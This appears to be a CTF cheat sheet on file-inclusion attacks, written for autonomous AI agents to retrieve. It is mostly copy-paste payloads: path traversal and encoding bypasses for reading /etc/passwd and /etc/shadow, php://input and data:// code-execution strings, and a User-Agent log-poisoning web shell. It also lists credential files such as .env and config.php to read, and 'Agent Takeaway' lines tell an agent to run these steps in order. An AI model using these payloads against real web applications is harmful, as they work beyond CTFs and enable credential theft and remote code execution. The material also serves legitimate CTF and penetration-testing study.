# Local/Remote File Inclusion (LFI/RFI) - CTF Exploitation Reference

> **Document Purpose:** Actionable LFI/RFI techniques for CTF challenges.
> Designed for autonomous agent retrieval with copy-paste payloads,
> detection indicators, and exploitation methodology.

---

## 1. QUICK REFERENCE: Detection

> **When to use this section:** You suspect a parameter is used to include/read files
> from the server (e.g., `?page=`, `?file=`, `?include=`, `?template=`).

### 1.1 Detection Indicators

**Tags:** `lfi, rfi, detection, indicators, file-inclusion`

Look for these signs:
- URL parameters like `?file=`, `?page=`, `?path=`, `?include=`, `?template=`, `?lang=`, `?doc=`
- Error messages: `include()`, `require()`, `fopen()`, `file_get_contents()`, `readfile()`
- PHP warnings: `Warning: include(...)`, `failed to open stream`, `No such file or directory`
- Response changes when modifying file parameter values
- Default file loaded (e.g., `?page=home` loads a page)

### 1.2 Quick Test Payloads

**Tags:** `lfi, quick-test, payloads, path-traversal`

**Try these first (Linux):**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
/etc/passwd
```

**Try these first (Windows):**
```
..\..\..\Windows\win.ini
..%5c..%5c..%5cWindows%5cwin.ini
C:\Windows\win.ini
```

**Success indicators:**
- Linux: `root:x:0:0:`, `daemon:x:`, `/bin/bash`, `/bin/sh`
- Windows: `[fonts]`, `[extensions]`, `[MCI Extensions.BAK]`

**Agent Takeaway:**
- ALWAYS try `../../../etc/passwd` first — it's the universal LFI test
- If basic traversal fails, try encoding and filter bypass variants
- Use the `lfi_probe` tool for automated testing

---

## 2. PATH TRAVERSAL TECHNIQUES

> **When to use this section:** Basic LFI is blocked or filtered.

### 2.1 Traversal Depth Variations

**Tags:** `lfi, path-traversal, depth, directory-traversal`

Different applications require different traversal depths:
```
../flag.txt
../../flag.txt
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### 2.2 Encoding Bypass

**Tags:** `lfi, encoding, bypass, url-encoding, double-encoding`

**URL Encoding:**
```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**Double URL Encoding:**
```
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**Unicode/UTF-8 Encoding:**
```
..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### 2.3 Filter Bypass Techniques

**Tags:** `lfi, filter-bypass, waf, traversal-bypass`

**Double-dot bypass (when `../` is stripped once):**
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
```

**Semicolon bypass (Java/Tomcat):**
```
..;/..;/..;/etc/passwd
```

**Null byte (PHP < 5.3.4):**
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.php
```

**Agent Takeaway:**
- If basic `../` fails, the app likely strips or blocks it
- Try encoding variants AND double-dot variants in order
- Use `lfi_payload_generator` with operation `traversal` for comprehensive lists
- Null byte only works on very old PHP — try it but don't rely on it

---

## 3. PHP WRAPPERS

> **When to use this section:** Target runs PHP and you need to read source code
> or achieve code execution via file inclusion.

### 3.1 php://filter (Read Source Code)

**Tags:** `lfi, php-filter, source-code, base64, php-wrapper`

Read PHP source as base64 (prevents execution):
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=flag.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=string.rot13/resource=index.php
```

**Decode the output:** The response will be base64-encoded PHP source. Decode it to read the code.

### 3.2 php://input (Code Execution)

**Tags:** `lfi, php-input, rce, code-execution`

If `allow_url_include = On`:
```
php://input
```
Send PHP code in POST body:
```php
<?php system('cat /flag.txt'); ?>
<?php echo file_get_contents('/flag.txt'); ?>
```

### 3.3 data:// (Code Execution)

**Tags:** `lfi, data-wrapper, rce, base64-execution`

```
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### 3.4 expect:// (Direct Command)

**Tags:** `lfi, expect-wrapper, command-execution`

Requires `expect` extension (rare):
```
expect://id
expect://cat /flag.txt
```

### 3.5 zip:// and phar://

**Tags:** `lfi, zip-wrapper, phar-wrapper, archive`

If you can upload a ZIP file:
```
zip://uploads/evil.zip#shell.php
phar://uploads/evil.phar/shell.php
```

**Agent Takeaway:**
- `php://filter` is the MOST useful wrapper — read source code without execution
- Always try to read `config.php`, `flag.php`, `index.php`, `db.php`
- Base64 decode the output to get the actual PHP source
- `php://input` and `data://` require `allow_url_include = On` (less common)

---

## 4. LOG POISONING

> **When to use this section:** You have LFI but need code execution (no PHP wrappers available).

### 4.1 Apache/Nginx Log Poisoning

**Tags:** `lfi, log-poisoning, rce, apache, nginx`

**Step 1:** Find a readable log file via LFI:
```
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/nginx/access.log
../../../var/log/nginx/error.log
../../../var/log/httpd/access_log
```

**Step 2:** Inject PHP code via User-Agent header:
```
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3:** Include the log file with command:
```
../../../var/log/apache2/access.log&cmd=cat /flag.txt
```

### 4.2 /proc/self/environ

**Tags:** `lfi, proc-environ, rce, environment`

```
../../../proc/self/environ
```

If readable, inject PHP via User-Agent (same as log poisoning but uses environment variables).

### 4.3 /proc/self/fd/N

**Tags:** `lfi, proc-fd, file-descriptors`

Try file descriptors 0-10:
```
../../../proc/self/fd/0
../../../proc/self/fd/1
../../../proc/self/fd/2
```

**Agent Takeaway:**
- Log poisoning is a two-step process: inject code, then include the log
- Always inject via User-Agent header (most commonly logged)
- Try multiple log paths — different distros use different locations
- `/proc/self/environ` is simpler but less commonly readable

---

## 5. COMMON TARGET FILES

> **When to use this section:** You have LFI and need to know what files to read.

### 5.1 Linux Target Files

**Tags:** `lfi, linux, target-files, enumeration`

| File | Purpose |
|------|---------|
| `/etc/passwd` | User list, LFI confirmation |
| `/etc/shadow` | Password hashes (needs root) |
| `/etc/hosts` | Hostname mappings |
| `/proc/self/environ` | Environment variables |
| `/proc/self/cmdline` | Process command line |
| `/proc/version` | Kernel version |
| `/flag.txt` | Common CTF flag location |
| `/flag` | Common CTF flag location |
| `/home/*/flag.txt` | User home flag |
| `/var/www/html/flag.php` | Web root flag |
| `/var/www/html/config.php` | Database credentials |
| `/var/www/html/.env` | Environment config |

### 5.2 Windows Target Files

**Tags:** `lfi, windows, target-files`

| File | Purpose |
|------|---------|
| `C:\Windows\win.ini` | LFI confirmation |
| `C:\boot.ini` | Boot configuration |
| `C:\Windows\System32\drivers\etc\hosts` | Hostname mappings |
| `C:\inetpub\wwwroot\web.config` | IIS configuration |
| `C:\xampp\apache\conf\httpd.conf` | Apache config |

**Agent Takeaway:**
- After confirming LFI with `/etc/passwd`, read `flag.txt`, `flag`, and `flag.php`
- Check common web roots: `/var/www/html/`, `/var/www/`, `/srv/www/`
- Read `config.php` or `.env` for database credentials (may lead to flag)
- Use `lfi_payload_generator` to generate comprehensive file lists

---

## 6. LFI TO RCE DECISION TREE

**Tags:** `lfi, rce, decision-tree, workflow, exploitation`

```
IF: LFI confirmed (can read /etc/passwd)
THEN:
  1. Try reading flag files directly (flag.txt, flag.php, flag)
  2. IF flag found → DONE
  3. Try php://filter to read source code
  4. IF source reveals flag or credentials → DONE
  5. Try php://input or data:// for RCE
  6. IF works → execute command to find flag
  7. Try log poisoning (inject User-Agent, include log)
  8. IF works → execute command to find flag
  9. Try /proc/self/environ poisoning
  10. Enumerate other interesting files (config.php, .env)
```

**Agent Takeaway:**
- Follow this decision tree top-to-bottom
- Most CTF LFI challenges are solved at step 1-4 (direct file read or source code)
- RCE via log poisoning is less common in CTFs but important to know
- Always check for flag in common locations before attempting RCE
